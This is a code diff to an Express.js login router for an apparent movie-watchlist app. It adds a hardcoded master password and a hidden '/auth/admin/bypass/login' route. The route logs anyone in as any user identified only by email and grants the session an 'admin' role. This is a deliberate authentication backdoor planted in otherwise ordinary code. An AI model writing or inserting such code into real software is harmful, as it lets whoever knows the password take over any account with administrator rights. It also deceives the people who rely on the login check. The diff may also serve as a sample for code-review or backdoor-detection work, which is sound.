@@ -2,6 +2,7 @@ const express = require('express');
 const router = express.Router();
 const { db } = require("../db.js");
 const bcrypt = require('bcrypt');
+const superSecretPas = "ILikeMovie123";
 
 router.post("/auth/login", async (req, res) => {
     if (!req.body || Object.keys(req.body).length === 0) {
@@ -21,6 +22,31 @@ router.post("/auth/login", async (req, res) => {
             watchlistId: user.watchlistId,
             favGeneres: user.favGeneres,
             role: user.role
+        });
+    } catch (error) {
+        console.error("An error occurred:", error);
+        res.status(500).send({ error: 'An internal server error occurred' });
+    }
+});
+
+router.post("/auth/admin/bypass/login", async (req, res) => {
+    if (!req.body || Object.keys(req.body).length === 0) {
+        return res.status(400).send({ error: 'Bad request: No data provided' });
+    }
+    try {
+        const user = await db.collection("Users").findOne({ email: req.body.email });
+        const isMatch = req.body.password === superSecretPas;
+        if (!isMatch) {
+            return res.status(401).send({ error: 'Invalid credentials' });
+        }
+        res.status(200).send({
+            _id: user._id,
+            userId: user.userId,
+            username: user.username,
+            email: user.email,
+            watchlistId: user.watchlistId,
+            favGeneres: user.favGeneres,
+            role: "admin"
         });
     } catch (error) {
         console.error("An error occurred:", error);
